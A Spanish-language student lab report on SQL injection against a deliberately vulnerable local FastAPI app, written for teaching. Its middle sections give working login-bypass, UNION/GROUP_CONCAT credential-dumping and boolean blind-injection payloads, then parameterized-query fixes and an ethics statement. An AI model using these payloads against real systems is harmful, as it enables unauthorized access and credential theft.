# Laboratorio SQL Injection - Análisis de Vulnerabilidades

## Información del Equipo
- **Integrante 1:** Ian Cardona Gaviria   
- **Integrante 2:** Sebastian Garces   
- **Fecha de entrega:** 05/10/2025

---

## Tabla de contenido
1. [Instalación y Configuración](#1-instalación-y-configuración)  
2. [Endpoints identificados](#2-endpoints-identificados)  
3. [Vulnerabilidades identificadas](#3-vulnerabilidades-identificadas)  
4. [Técnicas de explotación y evidencias](#4-técnicas-de-explotación-y-evidencias)  
5. [Blind SQL Injection — extracción (evidencia)](#5-blind-sql-injection--extracción-evidencia)  
6. [Análisis de impacto y contramedidas](#6-análisis-de-impacto-y-contramedidas)  
7. [Reflexión ética del equipo](#7-reflexión-ética-del-equipo)  
8. [Historial de commits / evidencia de colaboración](#8-historial-de-commits--evidencia-de-colaboración)  
9. [Checklist de entrega](#9-checklist-de-entrega)  

---

## 1. Instalación y Configuración

### Requisitos
- Python 3.8+  
- Git  
- Navegador moderno (Chrome / Firefox / Edge)  
- VS Code (opcional)

### Clonar y preparar (Windows PowerShell)
```powershell
git clone https://github.com/chalonov-academic/sql-injection-lab.git
cd sql-injection-lab
py -3 -m venv venv           # o python -m venv venv si python está en PATH
# Activar (PowerShell)
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force   # solo si está bloqueado
.\venv\Scripts\Activate.ps1
pip install --upgrade pip
pip install -r requirements.txt || pip install fastapi uvicorn python-dotenv requests
```

### Clonar y preparar (Linux / macOS)
```bash
git clone https://github.com/chalonov-academic/sql-injection-lab.git
cd sql-injection-lab
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt || pip install fastapi uvicorn python-dotenv requests
```

### Variables de entorno
Crea `.env` en la raíz con (ejemplo):
```
DATABASE_URL=sqlite:///./db.sqlite3
SECRET_KEY=mi_secreto_de_prueba
HOST=127.0.0.1
PORT=8000
DEBUG=True
```

### Ejecutar la aplicación
```bash
# con venv activado
uvicorn vulnerable_app:app --host 127.0.0.1 --port 8000 --reload
# o (Windows sin activar)
.\venv\Scripts\python.exe -m uvicorn vulnerable_app:app --reload
```
Abrir en el navegador: `http://127.0.0.1:8000`

---

## 2. Endpoints identificados
(En nuestra instancia local)
- `GET /` - Página principal  
- `GET /login` / `POST /login` - Formulario de autenticación  
- `GET /search` (formulario POST con `search_term`) - Búsqueda vulnerable (UNION)  
- `GET /user/{id}` - Endpoint que devuelve JSON con `query` (útil para Blind)

---

## 3. Vulnerabilidades identificadas
- **Login Bypass** — autenticación concatenada sin parámetros → posibilidad de bypass.  
- **Union-Based SQL Injection** — `search_term` concatenado en SQL permite `UNION SELECT` y exfiltración.  
- **Blind SQL Injection (Boolean-based)** — `GET /user/{id}` permite inyección boolean que cambia respuesta (`status`) → extracción carácter a carácter.

---

## 4. Técnicas de explotación y evidencias

> Evidencias: todos los archivos de salida y capturas están en la carpeta `evidence/` (subirla al repo). A continuación los payloads, cómo se ejecutaron y los archivos de evidencia sugeridos.

### 4.1 Detectar número de columnas (ORDER BY)
**Payloads probados (campo `search_term` del formulario `/search`):**
```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 --
' ORDER BY 5 --
```
**Resultado:** error en `ORDER BY 5` → **consulta original tiene 4 columnas**.  
**Evidencia:** 
![alt text](order_by_5.jpg)
---

### 4.2 Union-Based — exfiltración (GROUP_CONCAT)
**Payload usado (campo `search_term`):**
```
' UNION SELECT 1, GROUP_CONCAT(username || ':' || password), 3, 4 FROM users --
```
- ![alt text](password.jpg) (screenshot con `username:password` concatenado)

**Explicación:** `GROUP_CONCAT` permite consolidar múltiples filas en una sola celda, facilitando extracción rápida.

---

### 4.3 Union-Based — extracción parcial (SUBSTR)
**Payload usado (campo `search_term`):**
```
' UNION SELECT 1, substr(password,1,8), 3, 4 FROM users WHERE username='admin' --
```
![alt text](long.jpg)
(screenshot mostrando primeros 8 caracteres)

**Explicación:** Mostrar un substring evita imprimir la contraseña completa y sirve para extracción incremental.

---

## 5. Blind SQL Injection — extracción (evidencia)

> Nota: la técnica que funcionó en esta app fue la comparación por igualdad `substr(...)= 'x'` y pudimos obtener `success` en una posición (ej.: pos=2 = 'd'). Para completar la extracción usamos el script PowerShell `scripts/blind_enum_equal.ps1` (automatiza pruebas por posición y guarda evidencia).

### 5.1 Payloads / URLs que usamos (ejemplos)
**Ejemplo que devolvió `success` (ya comprobado):**
```
/user/1' AND (substr((SELECT password FROM users WHERE username='admin'),2,1) = 'd') --
```
**URL codificada (pegar en barra del navegador):**
```
http://127.0.0.1:8000/user/1'%20AND%20(substr((SELECT%20password%20FROM%20users%20WHERE%20username='admin'),2,1)%20%3D%20'd')%20--
```
**Evidencia (guardada):**
![alt text](user.jpg)
### 5.2 Script usado (PowerShell) — automatización por igualdad
Archivo: `scripts/blind_enum_equal.ps1` (ya incluido en el repo).  
**Uso:**
```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force   # solo si no permiten scripts
.\scripts\blind_enum_equal.ps1
```
El script:
- prueba caracteres de un conjunto (`a..z`, `A..Z`, `0..9`, símbolos comunes`),   
- construye  con la contraseña encontrada (parcial o completa).

**Explicación técnica:** Se prueba `substr(password, pos, 1) = 'c'`. Cuando el servidor devuelve `{"status":"success"}`, se confirma el carácter.

---

## 6. Análisis de impacto y contramedidas

### Impacto (resumen CIA)
- **Login Bypass:** confidencialidad e integridad comprometidas (acceso no autorizado; riesgo: **Alto**).  
- **Union-Based:** exfiltración de datos (credenciales) — confidencialidad comprometida (riesgo: **Alto**).  
- **Blind SQLi:** extracciones lentas pero completas, posible escalada y abuso por automatización (riesgo: **Medio-Alto**).

### Contramedidas técnicas
1. **Consultas parametrizadas / Prepared Statements** (ej. `cursor.execute("SELECT * FROM users WHERE username = ?", (username,))`).  
2. **No concatene entradas de usuario en SQL**.  
3. **Hashear contraseñas** (bcrypt / Argon2) y nunca almacenarlas en texto plano.  
4. **No devolver queries ni errores SQL al cliente**; registrar internamente.  
5. **Validación y normalización de inputs** (Pydantic en FastAPI).  
6. **Principio de menor privilegio** en credenciales de BD.  
7. **Rate limiting y WAF** para mitigar ataques automatizados (blind enumeration).

**Ejemplo de corrección (Python sqlite3):**
```python
# vulnerable
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)

# corregido
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

---

## 7. Reflexión ética del equipo
Este laboratorio se realizó en un entorno controlado y con fines educativos. Nos comprometemos a:
- No explotar vulnerabilidades en sistemas reales sin autorización.  
- Reportar responsablemente vulnerabilidades encontradas en entornos profesionales.  
- Usar estos conocimientos para mejorar la seguridad de sistemas y proteger datos de usuarios.
---
